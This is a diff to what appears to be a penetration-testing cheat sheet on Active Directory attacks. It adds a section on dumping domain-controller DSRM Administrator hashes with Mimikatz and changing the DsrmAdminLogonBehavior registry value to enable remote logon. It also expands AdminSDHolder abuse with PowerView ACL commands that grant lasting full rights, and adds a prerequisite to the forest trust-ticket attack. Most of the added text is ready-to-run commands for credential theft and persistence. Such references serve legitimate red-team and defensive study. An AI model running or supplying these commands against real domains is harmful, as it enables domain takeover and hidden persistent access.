@@ -70,6 +70,7 @@
     - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
     - [PrivExchange attack](#privexchange-attack)
     - [PXE Boot image attack](#pxe-boot-image-attack)
+    - [DSRM Credentials](#dsrm-credentials)
     - [Impersonating Office 365 Users on Azure AD Connect](#impersonating-office-365-users-on-azure-ad-connect)
   - [Linux Active Directory](#linux-active-directory)
     - [CCACHE ticket reuse from /tmp](#ccache-ticket-reuse-from-tmp)
@@ -1451,11 +1452,7 @@ Find users with `AdminCount=1`.
 ```powershell
 python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.100.20.1
 jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json
-``` 
-
-AdminSDHolder
-
-```powershell
+or
 Get-ADUser -LDAPFilter "(objectcategory=person)(samaccountname=*)(admincount=1)"
 Get-ADGroup -LDAPFilter "(objectcategory=group) (admincount=1)"
 or
@@ -1464,13 +1461,21 @@ or
 
 #### AdminSDHolder Abuse
 
-If you modify the permissions of **AdminSDHolder**, that permission template will be pushed out to all protected accounts automatically by SDProp.
+> The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all "protected groups" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.
+
+If you modify the permissions of **AdminSDHolder**, that permission template will be pushed out to all protected accounts automatically by SDProp (in an hour).
+E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.
 
 ```powershell
-# right to reset password for toto using the account titi
+# Add a user to the AdminSDHolder group:
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
+
+# Right to reset password for toto using the account titi
 Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword
-# give all rights
+
+# Give all rights
 Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 ```
 
 
@@ -1660,12 +1665,14 @@ Prerequisite:
 
 ### Forest to Forest Compromise - Trust Ticket
 
+* Require: SID filtering disabled
+
 From the DC, dump the hash of the `currentdomain\targetdomain$` trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using 
 Mimikatz, adding the SID for the target domain's enterprise admins group to our **SID history**.
 
 #### Dumping trust passwords (trust keys)
 
-> Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing “$” are computer accounts, but some are trust accounts.
+> Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing **$** are computer accounts, but some are trust accounts.
 
 ```powershell
 lsadump::trust /patch
@@ -2054,6 +2061,24 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
     >>>> >>>> UserPassword = Somepass1
     ```
 
+### DSRM Credentials
+
+> Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database.
+
+This is the local administrator account inside each DC. Having admin privileges in this machine, you can use mimikatz to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access to this local Administrator user.
+
+```ps1
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
+
+# Check if the key exists and get the value
+Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior 
+
+# Create key with value "2" if it doesn't exist
+New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD 
+
+# Change value to "2"
+Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
+```
 
 ### Impersonating Office 365 Users on Azure AD Connect
 
